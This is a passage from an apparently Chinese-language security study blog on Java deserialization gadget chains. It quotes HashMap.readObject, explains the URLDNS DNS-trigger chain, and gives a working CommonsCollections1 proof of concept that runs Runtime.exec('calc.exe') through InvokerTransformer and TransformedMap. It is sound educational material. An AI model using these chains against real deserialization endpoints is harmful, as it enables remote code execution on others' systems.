&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">GetField&lt;/span> &lt;span style="color:#111">fields&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readFields&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read loadFactor (ignore threshold)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">fields&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;loadFactor&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0.75f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">Float&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isNaN&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal load factor: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0.25f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#ae81ff">4.0f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UnsafeHolder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putLoadFactor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">reinitialize&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// Read and ignore number of buckets
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// Read number of mappings (size)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal mappings count: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">mappings&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// use defaults
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">float&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1.0f&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">DEFAULT_INITIAL_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">DEFAULT_INITIAL_CAPACITY&lt;/span> &lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span> &lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">tableSizeFor&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">fc&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">float&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">threshold&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">MAX_VALUE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Check Map.Entry[].class since it&amp;#39;s the nearest public type to
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// what we&amp;#39;re actually creating.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">SharedSecrets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getJavaOISAccess&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">checkArray&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Entry&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;rawtypes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;[]&lt;/span> &lt;span style="color:#111">tab&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;[])&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">table&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tab&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">mappings&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">K&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">V&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">putVal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hash&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是它重写的&lt;code>readObject&lt;/code>方法，在最后一行对key计算hash值，会触发hashCode方法，而计算hashCode时会触发DNS的请求&lt;/p>
&lt;p>构造链子时我们需要初始化一个&lt;code>java.net.URL&lt;/code>对象作为HashMap的key，之后将这个对象的hashCode设为-1，强制在反序列化时重新计算hashCode，触发后续调用&lt;/p>
&lt;p>另外在ysoserial的payload生成时为了防止执行DNS请求，使用了&lt;code>SilentURLStreamHandler&lt;/code>&lt;/p>
&lt;h2 id="cc18u71">CC1(&amp;lt;8u71&lt;/h2>
&lt;p>在p牛的java安全漫谈中给出了CC1的极简版demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">()),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="前置">前置&lt;/h3>
&lt;p>首先理解一下没见过的几个函数&lt;/p>
&lt;ul>
&lt;li>&lt;code>Transformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>一个接口，只有一个待实现的transform方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Transformer&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>TransformedMap&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>TransformedMap对innerMap作了修饰，传出的outerMap是修饰后的M&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">KeyTransformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">valueTransformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>keyTransformer是处理新元素key的回调，valueTransformer是处理新元素value的回调；这里的回调并不是回调函数 而是一个实现了上面Transformer接口的类&lt;/p>
&lt;ul>
&lt;li>&lt;code>ConstantTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">constantToReturn&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iConstant&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">constantToReturn&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">iConstant&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>是一个实现了Transformer接口的类，它的过程类似构造函数时传入一个对象，在transform方法中将这个对象返回，作用是包装任意一个对象，在执行回调时返回这个对象，方便后续操作&lt;/p>
&lt;ul>
&lt;li>&lt;code>InvokerTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>也是一个实现了Transformer接口的类，类可以用来执行任意方法，这也是反序列化能RCE的关键&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">paramTypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iParamTypes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">paramTypes&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iArgs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第一个参数是待执行的方法名，第二个参数是方法的参数类型，第三个是传入的参数&lt;/p>
&lt;p>之后的回调transform方法执行input对象的iMethodName方法&lt;/p>
